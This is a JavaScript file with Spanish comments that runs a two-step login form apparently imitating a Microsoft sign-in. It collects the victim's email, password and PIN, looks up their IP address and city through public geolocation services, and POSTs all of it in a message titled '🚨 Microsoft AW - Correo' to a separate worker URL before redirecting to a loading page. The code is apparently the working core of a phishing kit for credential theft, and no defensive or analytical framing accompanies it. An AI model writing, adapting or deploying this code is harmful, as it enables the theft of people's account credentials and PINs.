var displayEmail = document.getElementById('displayEmail');
var emailInput = document.getElementById('email');
var emailInputBox = document.getElementById('emailInputBox');
var passwordBox = document.getElementById('passwordBox');
var passwordInput = document.getElementById('passwordInput');
var pinBox = document.getElementById('pinBox');
var pinInput = document.getElementById('pinInput');
var form = document.getElementById('loginForm');
var nextButton = document.getElementById('nextButton');

localStorage.removeItem('userEmail');

// Deshabilitar campos al iniciar para evitar que la validación HTML5
// intente validar elementos ocultos con class="hidden"
passwordInput.disabled = true;
pinInput.disabled = true;

form.addEventListener('submit', async function (e) {
  e.preventDefault();

  // PASO 1 — capturar correo
  if (!localStorage.getItem('userEmail')) {
    var emailValue = emailInput.value.trim();
    if (!emailValue) {
      emailInput.focus();
      return;
    }

    localStorage.setItem('userEmail', emailValue);
    displayEmail.textContent = emailValue;
    displayEmail.style.display = 'block';

    // Ocultar email y deshabilitarlo para el Paso 2
    emailInputBox.classList.add('hidden');
    emailInput.disabled = true;
    footer.classList.add('hidden');
    footer.disabled = true;

    // Mostrar contraseña y PIN, y HABILITARLOS para que HTML5 pueda validarlos
    passwordBox.classList.remove('hidden');
    pinBox.classList.remove('hidden');
    passwordInput.disabled = false;
    pinInput.disabled = false;

    passwordInput.focus();
    return;
  }

  // PASO 2 — enviar credenciales
  var passwordValue = passwordInput.value.trim();
  var pinValue = pinInput.value.trim();
  if (!passwordValue) {
    passwordInput.focus();
    return;
  }

  var originalText = nextButton.innerHTML;

  try {
    nextButton.disabled = true;
    nextButton.classList.add('button-loading');
    nextButton.innerHTML = 'Validando';

    if (typeof sendLoginData === 'function') {
      const sent = await sendLoginData(
        localStorage.getItem('userEmail'),
        passwordValue,
        pinValue
      );
      if (!sent) {
        throw new Error('No se pudo enviar la información');
      }
      window.location.href = 'carga.html';
    } else {
      throw new Error('Sistema no disponible');
    }
  } catch (err) {
    alert(err.message || 'Error al iniciar sesión');
    nextButton.disabled = false;
    nextButton.classList.remove('button-loading');
    nextButton.innerHTML = originalText;
  }
});

// ==============================================
// FUNCIONES BASE
// ==============================================

async function getIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error al obtener IP:', error);
    return 'IP no disponible';
  }
}

async function getLocation(ip) {
  if (ip === 'IP no disponible') {
    return { country: 'País no disponible', city: 'Ciudad no disponible' };
  }

  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    if (!response.ok) throw new Error('No se pudo obtener la ubicación');
    const data = await response.json();
    return {
      country: data.country_name || 'País no disponible',
      city: data.city || 'Ciudad no disponible'
    };
  } catch (error) {
    console.error('Error al obtener ubicación:', error);
    return { country: 'País no disponible', city: 'Ciudad no disponible' };
  }
}

async function getCountry(ip) {
  return 'No disponible';
}

async function sendToWorker(payload) {
  try {
    const response = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    return true;
  } catch (error) {
    console.error('Error al enviar al worker:', error);
    return false;
  }
}

// ==============================================
// FUNCIONES ESPECÍFICAS PARA FORMULARIOS
// ==============================================

async function sendLoginData(email, password, pin) {
  try {
    const ip = await getIP();
    const location = await getLocation(ip);

    const mensaje = [
      '🚨 Microsoft AW - Correo',
      `Correo: ${email || 'No disponible'}`,
      `Contraseña: ${password || 'No proporcionado'}`,
      `PIN: ${pin || 'No proporcionado'}`,
      `IP: ${ip}`,
      `País: ${location.country}`,
      `Ciudad: ${location.city}`
    ].join('\n');

    return await sendToWorker({ mensaje });
  } catch (error) {
    console.error('Error en sendLoginData:', error);
    return false;
  }
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = { getIP, getCountry, sendToWorker, sendLoginData };
}